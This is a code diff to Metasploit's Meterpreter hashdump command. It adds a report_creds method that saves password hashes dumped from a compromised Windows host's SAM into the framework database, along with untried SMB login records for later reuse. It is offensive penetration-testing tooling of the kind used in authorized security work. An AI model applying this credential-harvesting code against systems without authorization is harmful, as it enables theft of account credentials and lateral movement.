@@ -39,13 +39,48 @@ class Console::CommandDispatcher::Priv::Passwd
   def cmd_hashdump(*args)
     client.priv.sam_hashes.each { |user|
       print_line("#{user}")
+      if shell.client.platform == 'windows' && !shell.framework.nil? && shell.framework.db.active
+        report_creds(user)
+      end
     }
-
     return true
   end
 
-end
+  def report_creds(user_data)
+    user = user_data.user_name
+    lm_hash = user_data.lanman.downcase
+    nt_hash = user_data.ntlm.downcase
+    invalid_password = lm_hash.eql?('aad3b435b51404eeaad3b435b51404ee') && nt_hash.eql?('31d6cfe0d16ae931b73c59d7e0c089c0')
+    return if (user.empty? || invalid_password)
 
+    # Assemble data about the credential objects we will be creating
+    credential_data = {
+      origin_type: :session,
+      post_reference_name: 'hashdump',
+      private_data: "#{lm_hash}:#{nt_hash}",
+      private_type: :ntlm_hash,
+      session_id: client.db_record.id,
+      username: user,
+      workspace_id: shell.framework.db.workspace.id
+    }
+
+    credential_core = shell.framework.db.create_credential(credential_data)
+
+
+    # Assemble the options hash for creating the Metasploit::Credential::Login object
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      address: ::Rex::Socket.getaddress(client.sock.peerhost, true),
+      port: 445,
+      service_name: 'smb',
+      protocol: 'tcp',
+      workspace_id: shell.framework.db.workspace.id
+    }
+
+    shell.framework.db.create_credential_login(login_data)
+  end
+end
 end
 end
 end
